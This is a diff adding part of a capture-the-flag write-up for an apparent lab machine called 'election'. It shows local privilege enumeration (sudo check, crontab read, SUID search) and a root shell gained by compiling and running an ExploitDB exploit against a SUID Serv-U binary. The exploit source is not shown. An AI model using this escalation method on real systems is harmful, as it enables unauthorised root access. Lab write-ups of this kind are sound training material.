@@ -363,3 +363,84 @@ love@election:/var/spool/cron/crontabs$
 
 Moving forward from here, decided to go with more of a manual way instead.
 
+```
+love@election:~$ sudo -l
+[sudo] password for love: 
+Sorry, user love may not run sudo on election.
+love@election:~$ ls -la /etc/sudoers
+-r--r----- 1 root root 755 May 23  2020 /etc/sudoers
+love@election:~$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+love@election:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/arping
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/sbin/pppd
+/usr/local/Serv-U/Serv-U
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/xorg/Xorg.wrap
+/bin/fusermount
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/su
+...
+love@election:~$ 
+
+```
+
+From here I've noticed the unusual and uncommon "Serv-U" binary. 
+
+```
+love@election:~$ ls -la /usr/local/Serv-U/Serv-U
+-rwsr-xr-x 1 root root 6319088 Nov 29  2017 /usr/local/Serv-U/Serv-U
+
+```
+
+A quick Google search from this point lead to finding an exploit script on ExploitDB. 
+
+![](attachments/Pasted%20image%2020250213212623.png)
+
+I was then able to quickly escalate my privileges from Love to Root after compiling the exploit code that was written in C programming language and executing it. 
+
+```
+love@election:~$ cd /tmp
+love@election:/tmp$ nano priv.c
+love@election:/tmp$ gcc priv.c -o exploit
+love@election:/tmp$ chmod +x exploit
+love@election:/tmp$ ./exploit
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
+opening root shell
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
+# 
+# whoami
+root
+# 
+
+```
+
